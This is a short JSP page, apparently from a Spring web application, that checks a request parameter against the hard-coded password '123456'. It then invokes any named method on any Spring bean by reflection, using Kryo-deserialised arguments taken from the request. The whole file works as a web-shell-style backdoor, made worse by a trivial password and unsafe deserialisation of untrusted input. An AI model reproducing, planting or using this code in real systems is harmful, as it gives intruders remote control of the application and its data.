<%@page import="com.alibaba.fastjson.JSONArray" %>
<%@page import="org.springframework.context.ApplicationContext" %>
<%@page import="org.springframework.web.context.support.WebApplicationContextUtils" %>
<%@page import="java.lang.reflect.Method" %>
<%@ page import="com.mark.service.util.KryoTool" %>
<%@ page language="java" contentType="text/html; charset=UTF-8"
         pageEncoding="UTF-8" %>
<% String pass = request.getParameter("p");
    if (null == pass || "".equals(pass.trim())) {
        return;
    }
    if (!"123456".equals(pass)) {
        return;
    }

    String content = "";
    ApplicationContext ctx = WebApplicationContextUtils.getWebApplicationContext(request.getSession().getServletContext());
    String bean = request.getParameter("bean");
    String methodParam = request.getParameter("method");
    String argsParam = request.getParameter("args");

    Object obj = ctx.getBean(bean);
    Method[] methods = obj.getClass().getMethods();

    for (Method method1 : methods) {
        if (method1.getName().equalsIgnoreCase(methodParam)) {
            Class<?> clazz = Class.forName("[Ljava.lang.Object;");
            Object[] argObjs = (Object[]) KryoTool.decode(argsParam, clazz);
            Object invoke = method1.invoke(obj, argObjs);
            JSONArray array = new JSONArray();
            array.add(invoke.getClass().getName());
            array.add(KryoTool.encode(invoke));
            content = array.toJSONString();
            break;
        }
    }
%>
<%=content %>